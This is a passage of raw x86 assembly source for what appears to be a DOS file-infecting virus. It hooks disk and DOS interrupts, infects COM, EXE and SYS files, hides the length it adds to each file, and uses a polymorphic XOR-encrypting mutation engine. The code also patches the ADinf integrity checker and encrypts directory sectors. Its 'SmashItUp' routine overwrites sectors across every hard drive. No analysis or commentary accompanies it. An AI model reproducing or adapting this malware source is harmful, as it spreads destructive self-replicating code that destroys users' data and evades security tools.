       mov cx,Common_Len
       rep movsb
       mov ds,cx
       mov ds:[97h*4+2],ax
       mov ds:[98h*4+2],ax
       mov ds:[99h*4+2],ax
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   CheckMCB:
       mov ds,ax
       stc
       adc ax,[di+3]
       cmp ax,dx
   NoKernelMCB:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   HookFile:
       call    NoCryptDir
   HookVectors:
       call    ChkSumBIOS
       mov cs:CrcBIOS,ax
       mov cs:Jump21h,NoHookDOS
       call    Get1stMCB
       mov di,MemBase13h
       call    Hook13h
       mov di,MemBase2Fh
       lea ax,Int_2Fh_entry
       mov bx,v2Fh*4-20h
       mov cl,99h
       lea si,save_2Fh_off
       call    Hook
   Hook21h:
       mov di,MemBase21h
       lea ax,Int_21h_entry
       mov bx,v21h*4-20h
       mov cx,98h
       lea si,save_21h_off
       jmp Hook
   Hook13h:
       lea ax,Int_13h_entry
       mov bx,v13h*4-20h
       mov cx,97h
       lea si,save_13h_off
   Hook:
       cli
       mov byte ptr [di],0CDh      ;INT xx
       mov [di+1],cl
       push    ds cx ds
       mov cl,2
       mov ds,cx
       xchg    di,[bx]
       mov cs:[si],di
       pop di
       xchg    di,[bx+2]
       mov cs:[si+2],di
       pop bx
       shl bx,cl
       mov [bx-20h],ax
       mov [bx-20h+2],cs
       pop ds
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   ChkSumBIOS:
       mov bx,5
       lea ax,[bx-6]
       mov ds,ax
       mov cx,10h-6
   CalcChkSum:
       xor ax,[bx]
       inc bx
       loop    CalcChkSum
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   CorrectLength:
       mov ah,2Fh
       int 21h
       mov al,0
   WhichFind   equ byte ptr $-1
       push    es cs
       pop es
       lea di,NameBuffer
       cmp al,4Eh
       jne NoFindFirst
       call    FindName
       sub dx,si
       mov cx,dx
       rep movsb
       mov cs:EndPath,di
   NoFindFirst:
       pop ds
       mov cx,8
       jae NoFCB
       cmp byte ptr [bx],-1
       jne NoExtFCB
       add bx,7
   NoExtFCB:
       mov si,bx
       inc bx
       call    GetTimeFind
       jne FindExitShort
       inc bx
       inc bx
       lodsb
       add al,'A'-1
       mov ah,':'
       stosw
       call    ConvName
       mov al,'.'
       stosb
       mov cl,3
       lea ax,OpenFile
       push    ax
   ConvName:
       lodsb
       cmp al,' '
       je  EndConv
       stosb
   EndConv:
       loop    ConvName
       retn
   NoFCB:
       call    GetTimeFind
   FindExitShort:
       jne FindExit
       lea si,[bx+1Eh]
       mov cl,0Ch
       lea di,NameBuffer
   EndPath     equ word ptr $-2
       rep movsb
   OpenFile:
       push    bx ds cs
       pop ds
       mov [di],cl
       call    HookAll
       lea dx,NameBuffer
       mov ah,3Dh
       int 3
       jc  ExitCheck
       xchg    bx,ax
       mov ax,4400h
       int 3
       test    dl,dl
       js  CloseFile
       dec cx
       mov dx,-2
       mov ax,4202h
       int 3
       lea dx,ChkLen
       mov cx,2
       mov ah,3Fh
       int 3
       jc  CloseFile
       sub ax,cx
       jc  CloseFile
       mov cx,0
   ChkLen      equ word ptr $-2
   CloseFile:
       mov ah,3Eh
       int 3
   ExitCheck:
       call    ReHookAll
       pop ds bx
       xchg    cx,ax
       cmp ax,Len_Const
       jb  FindExit
       cmp ax,Len_Const+3000h
       ja  FindExit
       les cx,dword ptr [bx+1Ah]
       mov dx,es
       sub cx,ax
       sbb dx,0
       jc  FindExit
       mov [bx+1Ah],cx
       mov [bx+1Ch],dx
   FindExit:
       pop dx
       jmp ExitDskShort

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Int_13h_entry:
       add sp,6
       jmp $
   Jump13h     equ byte ptr $-1
       cmp dx,80h
       jne NoWriteSec
       test    cx,0FFC0h
       jnz NoWriteSec
       dec cx
       jz  MyCyl
       push    ax
       add al,cl
       cmp al,0
   BegSec      equ byte ptr $-1
       pop ax
       jb  IncSecNum
   MyCyl:
       cmp ah,3
       je  ResetDsk
       cmp ah,0Bh
       je  ResetDsk
       cmp ah,5
       jb  IncSecNum
       cmp ah,7
       ja  IncSecNum
   ResetDsk:
       mov ah,0
   IncSecNum:
       inc cx
   NoWriteSec:
   NonDsk      equ $-Jump13h-1
       mov cs:SaveFn,ah
       mov cs:SaveNumSec,al
       cmp ah,6Ah
       je  ExitDsk
       pushf
       db  9Ah         ;CALL ????:????
   save_13h_off    dw  ?
   save_13h_seg    dw  ?
       jc  ExitDsk
       pushf
       cld
       push    ax ds si di
       jmp $
   Jump21h     equ byte ptr $-1
       push    bx
       mov bx,8
       mov ds,bx
       cmp byte ptr [bx+21h*4+3-80h-8],bl
       ja  NoHook21h
       lds bx,dword ptr cs:save_13h_off
       push    cx dx es ds
       pop es
       mov dx,bx
       mov ah,13h
       int 2Fh
       call    HookVectors
       pop es dx cx
   NoHook21h:
       pop bx
   NoHookDOS   equ $-Jump21h-1
       mov ax,0
   SaveFn      equ byte ptr $-2
       push    bx cx es cs
       pop ds
       cmp al,2
       jne NoRead
       cmp cx,1
   TurnFloppy  label   byte
       jne ItsRead
       cmp dx,cx
       ja  ItsRead
       push    bp
       call    WriteFloppy
       pop bp
   ExitDskShort:
       pop es cx bx di si ds ax
       popf
   ExitDsk:
       retf    2
   NoRead:
       cmp al,3
       jne ExitDskShort
   ItsRead:
       cmp ah,Jump13h
       jne ExitDskShort
       cmp dl,80h
       jne ExitDskShort
       test    dh,dh
       jnz NoFirstCyl
       test    cx,0FFC0h
       jz  FirstCyl
   NoFirstCyl:
       mov CryptOrDecrypt,78h  ;JS
       call    EncryptDir
   ExitDskVeryShort:
       jmp ExitDskShort
   FirstCyl:
       dec cx
       jnz NoReadMBR
       lea si,MBRBuffer
       mov di,0
   IntoMBR     equ word ptr $-2
       inc di
       jz  NoReadMBR
       dec di
       add di,bx
       mov cl,LenMBR
       rep movsb
       and byte ptr es:[bx+1BDh],7Fh
   NoReadMBR:
       inc cx
       mov al,SaveNumSec
       sub cl,BegSec
       jae InsideBody
       add al,cl
       ja  ExitFirst
       je  ExitFirst       ;CF=ZF=1 ?
       shl cl,1
       sub bh,cl
       mov cl,0
   InsideBody:
       neg cl
       add cl,SECTORS
       cmp al,cl
       jbe NextSecFill
       xchg    cx,ax
   NextSecFill:
       mov cx,200h
   Num200h     equ word ptr $-2
   NextByteFill:
       mov es:[bx],ah
       inc bx
       loop    NextByteFill
       dec ax
       jnz NextSecFill
   ExitFirst:
       jmp ExitDskVeryShort

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Int_24h_entry:
       mov al,3
   Int_23h_entry:
       iret

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   ItsSetTime:
       push    cx dx
       mov ax,5700h
       int 21h
       call    GetTimeMove
       pop dx cx
       jne NoHook
       lea ax,NoHook
       push    ax

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   SetTimeFile:
       push    dx
       call    GetTimeMove
       and cl,11100000B
       or  cl,dl
       pop dx
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Int_21h_entry:
       add sp,6
   Int_21h_recurse:
       pushf
       cld
       push    ax
       xchg    ah,al
       jmp $
   CheckJump   equ byte ptr $-1
       cmp ax,157h
       je  ItsSetTime
       cmp ax,4Bh
       je  FnHookShort
       cmp ax,16Ch
       je  ItsOsExtCreate
       cmp ax,6Ch
   ItsOsExtCreate:
       mov ah,GoCreate
       je  ItsExtCreate
       cmp al,3Ch
       je  ItsFind
       cmp al,5Bh
       je  ItsFind
       cbw
       cmp al,11h
       je  ItsFind
       cmp al,12h
       je  ItsFind
       mov ah,GoFind
       cmp al,4Eh
       je  ItsFind
       cmp al,4Fh
       je  ItsFind
       mov ah,GoClose
       cmp al,3Eh
       jne ItsNoClose
       cmp bx,0AA55h
   WhichHandle equ word ptr $-2
       je  ItsFind
   ItsNoClose:
       cmp al,3Dh
       je  FnHookShort
       cmp al,56h
       je  FnHookShort
       cmp al,0ABh
       je  FnHookShort
   GoOutCheck  equ $-CheckJump-1
       sub al,4Ch
       jnz NoHook
       mov cs:CheckJump,al
   NoHook:
   JumpNoHook  equ $-ExitPlace-2
       pop ax
       popf
       db  0EAh            ;JMP ????:????
   save_21h_off    dw  ?
   save_21h_seg    dw  ?
   ItsExtCreate:
       test    dl,12h
   FnHookShort:
       jz  FnHook
   ItsFind:
   OffsItsFind equ $-NoHook
       mov cs:WhichFind,al
       mov cs:JumpFind,ah
       pop ax
       popf
       pushf
       call    dword ptr cs:save_21h_off
       pushf
       cld
       push    ax ds si di bx cx es dx
       jmp $
   JumpFind    equ byte ptr $-1
       add al,2
   GoFind      equ $-JumpFind-1
       jc  OkFind
       jmp CorrectLength
   GoSetVec    equ $-JumpFind-1
       call    Get1stMCB
       call    Hook21h
       stc
   GoCreate    equ $-JumpFind-1
       jc  OkFind
       push    cs
       pop es
       cmp cs:WhichFind,6Ch
       je  WasExtCreate
       mov si,dx
   WasExtCreate:
       lea di,CreateBuffer
       mov cs:WhichHandle,ax
   NextLetter:
       lodsb
       stosb
       cmp al,1
       jae NextLetter
   GoClose     equ $-JumpFind-1
       jc  OkFind
       push    cs
       pop ds
       or  WhichHandle,-1
       lea dx,CreateBuffer
       mov ah,0ABh
       pushf
       push    cs
       call    Int_21h_recurse
   OkFind:
       jmp FindExit
   FnHook:
       push    bx cx dx si di bp ds es
       mov cs:ExitPlace,JumpNoHook
       mov cs:ItSelFn,al
       cmp al,6Ch
       jne NoExtOpen
       mov dx,si
   NoExtOpen:
       push    ax
       cmp al,4Bh
       jne NoExec
       mov cs:SegEPB,es
       jmp $
   MemMove     equ byte ptr $-1
       push    bx dx ds
       call    Stay
       pop ds dx bx
   MemMoveOff  equ $-MemMove-1
   NoExec:
       call    FindName
       xchg    dx,si
       push    cs
       pop es
       lea di,NameTable1
       mov cx,21
       call    CompName
       pop ax
       je  Return0VeryShort
       cmp al,4Bh
       jne NoCheckDetect
       lea di,NameSpec3
       mov cl,2
       call    CompNameFour
       jne NoNetWare
       add cs:ExitPlace,OffsItsFind
       push    ds
       lds ax,dword ptr cs:save_21h_off
       push    ds
       mov ds,cx
       mov ds:[v21h*4],ax
       pop ds:[v21h*4+2]
       pop ds
   NoNetWare:
       lea di,NameWin
       call    CompName
       jne NoWin
       push    es
       mov es,cs:SegEPB
       les di,dword ptr es:[bx+2]
       mov al,es:[di]
       cbw
       add byte ptr es:[di],5
       stc
       adc di,ax
       mov ax,'/ '         ;/D:F
       stosw
       mov ax,':D'
       stosw
       mov ax,0D00h+'F'
       stosw
       pop es
   NoWin:
       lea di,NameSpec4
       call    CompName
       jne ItsNoVBA
       call    RandThree
       jz  SmashItUp
   ItsNoVBA:
       mov cs:CheckJump,GoOutCheck
       lea di,NameSpec1
       call    CompNameFour
       je  NextChar
   NoCheckDetect:
       lea di,NameSpec2
       call    CompNameTwo
   Return0VeryShort:
       je  Return0Short
       mov cs:CheckJump,cl
       mov cs:Sys,2
       lea di,NameTable2
       call    CompNameThree
       je  Begin
   NextChar:
       lodsb
       test    al,al
       jnz NextChar
       cmp byte ptr [si-5],'.'
       jne Return0Short
       mov cs:Sys,al
       lea si,[si-4]
       lea di,NameCOM
       call    CompNameTwo
       je  Begin
       inc cs:Sys
       lea di,NameSYS
       call    CompNameTwo
       je  Begin
   Return0Short:
       jmp Return0

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Int_2Fh_entry:
       add sp,6
       cmp ax,1300h
       jne NoGetDrv
       push    bp
       mov bp,sp
       push    ds
       lds bp,dword ptr [bp+2]
       cmp word ptr ds:[bp+12h],75CCh ;???,CC/JNE xx ?
       jne ItsNoADINF
       cmp cs:FileFloppy,0
       org $-1
       clc
       jne PatchADINF
       xchg    cx,ax
   SmashItUp:
       mov dx,80h
   NextDrv:
       mov ax,501h
       call    Int_13h
       inc dx
       mov ah,10h
       int 13h
       jnc NextDrv
       inc ch
       jnz SmashItUp
       add cl,40h
       jmp SmashItUp
   PatchADINF:
       mov ds:[bp+14h],al      ;JNE $+2
       mov cs:CheckJump,GoOutCheck
   ItsNoADINF:
       pop ds bp
   NoGetDrv:
       db  0EAh
   save_2Fh_off    dw  ?
   save_2Fh_seg    dw  ?

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Begin:
       call    HookAll
       cmp cs:Sys,2
       je  NoCheckSpace
       mov si,dx
       lodsw
       and al,1Fh
       cmp ah,':'
       je  NoDefaultDrive
       mov ah,19h
       int 3
       inc ax
   NoDefaultDrive:
       xchg    bx,ax
       mov ax,4408h
       int 3
       dec ax
       js  ItsFloppyDrive
       mov al,0
   ItSelFn     equ byte ptr $-1
       cmp al,0ABh
       jne ItsNoSelFn
       call    RandFour
       IF  DEBUG EQ 0
       jz  ItsFloppyDrive
       ELSE
       jmp ItsFloppyDrive
       ENDIF
   ItsNoSelFn:
       mov ax,4409h
       int 3
       jc  Return1Short
       test    dh,10h
       jnz ItsFloppyDrive
   FileFloppy  label   byte
       stc
       jc  Return1Short
   ItsFloppyDrive:
       mov dl,bl
       mov ah,36h
       int 3
       inc ax
       jz  Return1
       dec ax
       mul bx
       cmp ax,(Len_Const+3000h)/200h
   Return1Short:
       jbe Return1
       lea dx,[si-2]
       mov ax,4300h
       int 3
       jc  Return1
       test    cl,14h
       jnz Return1
   NoCheckSpace:
       mov bx,cx
       sub cx,cx
       mov ax,4301h
       int 3
       jc  Return1
       push    bx dx ds
       mov ax,3D92h
       int 3
       jc  Return2
       xchg    bx,ax
       mov ah,40h
       cmp cs:Sys,2
       je  Return4
       mov ax,5700h
       int 3
       jc  Return3
       push    dx cx
       call    GetTimeMove
       je  SetTime
       call    SubWrite
       jc  SetTime
       mov al,1Eh
       call    Rand
   SetTime:
       pop cx dx
       jbe NoHappy
       call    SetTimeFile
   NoHappy:
       mov ax,5701h
   Return4:
       int 3
   Return3:
       mov ah,3Eh
       int 3
   Return2:
       pop ds dx cx
       mov ax,4301h
       cmp al,cs:Sys
       jae NoDel
       mov ah,41h
   NoDel:
       int 3
   Return1:
       call    ReHookAll
   Return0:
       pop es ds bp di si dx cx bx
       mov ah,GoSetVec
       db  0E9h            ;JMP NEAR
   ExitPlace   dw  ?

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   HookAll:
       pop cs:Temp
       cli
       mov si,ds
       sub bx,bx
       mov ds,bx
       mov bl,23h*4
       les ax,dword ptr [bx-80h]
       push    es ax
       les ax,dword ptr [bx]
       push    es ax
       les ax,dword ptr [bx+4]
       push    es ax ds
       les ax,dword ptr cs:save_21h_off
       mov [bx-80h],ax
       mov [bx-7Eh],es
       mov word ptr [bx],offset Int_23h_entry
       mov [bx+2],cs
       mov word ptr [bx+4],offset Int_24h_entry
       mov [bx+6],cs
       mov ds,si
       mov ah,54h
       int 3
       mov ah,2Eh
       push    ax
       mov al,0
       int 3
   TempShort:
       sti
       jmp cs:Temp

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   ReHookAll:
       pop cs:Temp
       pop ax
       int 3
       pop ds
       mov bx,23h*4
       cli
       pop word ptr [bx+4]
       pop word ptr [bx+6]
       pop word ptr [bx]
       pop word ptr [bx+2]
       pop word ptr [bx-80h]
       pop word ptr [bx-7Eh]
       jmp TempShort

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   CompNameFour:
       inc cx
   CompNameThree:
       inc cx
   CompNameTwo:
       inc cx
   CompName:
       inc cx
   CompNext:
       push    si cx
       mov cl,es:[di]
       inc di
       mov ax,cx
       add ax,di
       push    ax
   NextComp:
       lodsb
       or  al,20h
       xor al,8Bh
       scasb
       loope   NextComp
       pop di cx si
       loopne  CompNext
   OkComp:
       mov cl,0
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   GetTimeFind:
       mov ax,[bx+16h]
       mov dx,[bx+18h]
       cmp ax,0
       org $-2
   GetTimeMove:
       mov ax,cx
   GetTime:
       push    ax
       and al,11100000B
       xor ax,dx
       sub dx,dx
       div cs:TimeMask
       pop ax
       and al,00011111B
       cmp dl,al
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   CheckExeSize:
       xchg    bp,ax
       mov di,dx
       mov ax,[si+4]
       cmp cx,[si+2]
       je  ZeroLast
       dec ax
   ZeroLast:
       mul Num200h
       add ax,[si+2]
       cmp dx,di
       jne GoAway
       cmp ax,bp
   GoAway:
       stc
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   CheckEXE:
       mov di,40h
       cmp di,[si+0Ah]
       jbe MinMem
       mov [si+0Ah],di
   MinMem:
       cmp di,[si+0Ch]
       jbe MaxMem
       mov [si+0Ch],di
   MaxMem:
       cmp dx,0Fh
       ja  GoAway
       call    CheckExeSize
       jne GoAway
       mov OffBuff,cx
       add ax,0Fh
       adc dx,cx
       and al,0F0h
       xchg    dx,ax
       xchg    cx,ax
       mov ax,4200h
       int 3
       mov WhatSUB,ax
       div Num10h
       sub ax,[si+8]
       mov [si+0Eh],ax
       mov [si+16h],ax
       call    MutationZeroOff
       jc  GoAway
       mov [si+14h],ax
       add ax,400h
       mov [si+10h],ax
       call    SeekEnd
       div Num200h
       test    dx,dx
       jz  ZeroFull
       inc ax
   ZeroFull:
       mov [si+4],ax
       mov [si+2],dx
       jmp WriteMain

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   SubWrite:
       push    cs cs
       pop es ds
       mov ah,2Ah
       int 3
       call    RandFour
       dec ax
       js  StoreBadDay
       xchg    dx,ax
       and al,00011000b
   StoreBadDay:
       mov DayX,al
       call    RandByte
       add ax,Len_Const
       mov SaveLen,ax
       mov LenEnc,ax
       lea dx,Header
       mov cx,1Ah
       mov ah,3Fh
       int 3
       jc  Exit0
       xor ax,cx
       jne Exit0
       lea di,Buffer
       mov WhatOff,ax
       mov WhatSUB,ax
       mov JumpSYS,al
       mov JumpCOM,al
       mov byte ptr [di-BuffCorrStck],0
       org $-1
       nop
       mov CLDorCLI,0
       org $-1
       cli
       mov si,dx
       cmp al,0
   Sys     equ byte ptr $-1
       je  NoSYS
       cmp word ptr [si],-1
       jne Exit0
       mov ax,[si+6]
       mov SaveSYS,ax
       mov OffSYS,ax
       mov byte ptr [di-BuffJumpSYS],OffDriver
   NoSYS:
       movsw
       movsw
       movsw
       movsw
       movsw
       lodsw
       lodsw
       movsw
       movsw
       lodsw
       movsw
       movsw
       mov si,dx
       call    SeekEnd
       mov StoreLength,ax
       test    dx,dx
       jnz BigFile
       cmp ax,-(Len_Const+30A0h)
       jae BigFile
       cmp ax,Len_Const+0FEh+1Ch
       jae OkFile
   Exit0:
       stc
       retn
   BigFile:
       call    CheckExeSign
       jne Exit0
   GoBig:
       jmp CheckEXE
   OkFile:
       mov OffBuff,ax
       call    CheckExeSign
       jne NoExeSmall
       cmp word ptr [si+18h],40h
       jae GoBig
       mov di,[si+6]
       shr di,2
       neg di
       add di,[si+8]
       cmp di,21h
       ja  GoBig
       call    CheckExeSize
       jne Exit0
   NoExeSmall:
       sub ax,SaveLen
       mov cx,ax
       call    RandWord
       cmp ax,1Ch
       jae NoBegin
       xchg    cx,ax
   NoBegin:
       xchg    dx,ax
       call    SeekAnother
       mov WhatOff,ax
       mov di,ax
       add ax,offset Continue
       mov BegCrypt,ax
       lea dx,MainBuffer
       mov cx,SaveLen
       mov ah,3Fh
       int 3
       cmp ax,cx
       jne Exit0
       mov si,dx
       call    BigRand
       mov Mask2,ax
       call    BigRand
       mov Mask1,ax
       call    SubXOR
       mov Mask1,ax
       push    cx
       call    SeekEnd
       pop cx
       call    WriteFromSI
       sub ax,cx
       jnz Exit0
       cmp al,Sys
       jne WasSYS
       dec byte ptr ds:WhatSUB+1
       inc byte ptr ds:WhatOff+1
       inc byte ptr ds:BegCrypt+1
       inc byte ptr ds:OffBuff+1
       mov JumpCOM,ForCOM
       call    RandHalf
       jnz CaseJump
       mov CorrStck,0
       org $-1
       pop ax
   CaseJump:
       or  al,0E8h         ;CALL(JMP) NEAR
       mov JumpCall,al
   WasSYS:
       mov dx,di
       mov al,0
       call    SeekAnother
       call    Mutation
       jc  Exit1
       cmp Sys,1
       jne NoWasSYS
       mov [si+6],ax
       jmp WriteMain
   NoWasSYS:
       mov di,si
       push    bx
       call    AltNOP
       pop bx
       mov byte ptr [di],0
   JumpCall    equ byte ptr $-1
       sub ax,103h
       sub ax,di
       add ax,si
       inc di
       stosw
   WriteMain:
       call    SeekBeg
       mov cl,18h
       call    WriteFromSI
       call    SeekEnd
       sub ax,0
   StoreLength equ word ptr $-2
       inc ax
       inc ax
       mov [si],ax
       mov cl,2
   WriteFromSI:
       mov dx,si
       mov ah,40h
       int 3
   Exit1:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MultiMorphic:
       mov ax,LenEnc
       mov NewLen,ax
       push    bx
       call    ChainMutation
       mov LenEnc,ax
   MoveBuffer  label   byte
       lea bx,MainBuffer
       mov cx,0
   NewLen      equ word ptr $-2
       mov al,0
   CryptMask   equ byte ptr $-1
       call    Encryptor
       pop bx
   WriteEnd:
       lea dx,MainBuffer
       mov cx,SaveLen
       mov ah,40h
       int 3
       jc  Exit1
       sub ax,cx
       jc  Exit1
       call    SeekEnd
       call    RandEight
       xchg    dx,ax
       mov al,2
       jmp SeekAnother

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   SeekBeg:
       mov al,0
       cmp ax,0
       org $-2
   SeekEnd:
       mov al,2
   Seek:
       sub dx,dx
   SeekAnother:
       sub cx,cx
       mov ah,42h
       int 3
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   SubXOR:
       mov cx,cs:SaveLen
       push    si cx
   XORing:
       xor word ptr [si],0AA55h
   Mask1       equ word ptr $-2
       sub cs:Mask1,0AA55h
   Mask2       equ word ptr $-2
       inc si
       loop    XORing
       pop cx si

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   CheckExeSign:
       cmp word ptr [si],'ZM'
       je  YesEXE
       cmp word ptr [si],'MZ'
   YesEXE:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   EncryptDir:
       push    cx es
       pop ds
       call    CryptSec
       pop cx
       IF  DEBUG EQ 0
       jnc CryptSec
       ELSE
       jmp CryptSec
       ENDIF
       call    Int_13h_write

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   CryptSec:
       mov cx,0
   SaveNumSec  equ byte ptr $-2
       push    cx
       mov si,bx
   ScaNextSec:
       push    cx
       mov cl,10h
   ScaNextElem:
       push    cx si
       mov cl,0Bh
   NextCharName:
       lodsb
       cmp al,' '
       jb  GetNextElem
       loop    NextCharName
       lodsb
       test    al,11001000B
       jnz GetNextElem
       mov cl,9
   NextChaRes:
       lodsb
       test    al,al
       jnz GetNextElem
       loop    NextChaRes
       test    [si],dl
   CryptOrDecrypt  label   byte
       js  GetNextElem
       xor [si],dl
       mov ax,0
   MaskXOR     equ word ptr $-2
       xor ax,[si+1]
       xor [si+5],ax
       mov ah,1
   GetNextElem:
       pop si cx
       add si,20h
       loop    ScaNextElem
       pop cx
       loop    ScaNextSec
       inc cs:CryptOrDecrypt
       sahf
       pop ax
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   MutationZeroOff:
       mov BegCrypt,offset Continue
   Mutation:
       mov ax,SaveLen
       sub ax,offset Continue
       mov LenCrpt,ax
       mov ZeroCLI,6
       mov WhatSimple,2
       push    bx
       sub di,di
       call    GetSenseless
       call    RandEight
       jz  NoUseTrick2
       lea ax,SetDrv
       lea dx,SeTrickFn
       call    Choose
       mov ax,0
       org $-2
       int 13h
       stosw
       mov cl,73h          ;JNC
       call    GetJmpCarry
       mov al,80h-40h
       call    Rand
       add al,40h
       stosb
   NoUseTrick2:
       call    MoveCLI
       call    ZeroRand
       call    MoveCLI
       mov al,2
       jne NotBeSS
       cmp JumpSYS,OffDriver
       je  NotBeSS
       inc ax
   NotBeSS:
       lea bx,SegRegTable
       call    Rand
       xlat
       mov ChooSegm,al
       push    ax
       mov ah,al
       mov al,0
   RegWord     equ byte ptr $-1
       call    RandZF
       mov bx,750h         ;PUSH WordRegister/POP SegmRegister
       jz  LetPushSeg
       mov bx,0C08Eh       ;MOV SegmRegister,WordRegister
       or  bh,al
       mov al,0
   LetPushSeg:
       or  ax,bx
       stosw
       call    MoveCLI
       call    RandHalf
       pop ax
       lea bx,WorkRegTable+4
       jz  NoCheckDS
       cmp al,3 shl 3      ;DS ?
       je  NoStoreDS
   NoCheckDS:
       or  al,26h          ;Segment Prefix
       stosb
       inc bx
       inc bx
   NoStoreDS:
       call    RandHalf
       or  al,0C4h         ;LDS or LES
       xchg    dx,ax
       lea si,WorkRegTable
   CheckNextReg:
       lodsw
       or  ah,40h
       cmp al,RegWord
       jne NoByteMode
       call    RandZF
       jz  ByteMode
   NoByteMode:
       cmp si,bx
       jbe CheckNextReg
       mov ah,110B
   ByteMode:
       mov dh,ah
       pushf
       call    GetWorkReg
       shl al,cl
       or  dh,al
       mov BaseReg1,ah
       mov ax,dx
       stosw
       call    RandHalf
       mov al,1*4          ;Int 1 address
       jz  ThisAddr
       mov al,3*4          ;Int 3 address
   ThisAddr:
       popf
       jne WordMode
       stosb
       cmp al,0
       org $-1
   WordMode:
       stosw
       xchg    bx,ax
       mov dh,0
       org $-1
       iret
       cmp JumpSYS,GoBOOT
       pushf
       jne NoBootMutate
       cmp bh,byte ptr ds:ReadHead
       jne ItsBootMutate
       call    RandShift
       shl al,1
       add al,1Bh*4        ;Int 1Bh/1Ch address
       mov bx,-1
       cmp ah,[bx+di]
       jne WasByteMode
       dec bx
   WasByteMode:
       mov [bx+di],al
       jmp NoBootMutate
   ItsBootMutate:
       push    ds
       lds bx,dword ptr ss:[bx]
       mov dh,[bx]
       pop ds
   NoBootMutate:
       push    dx
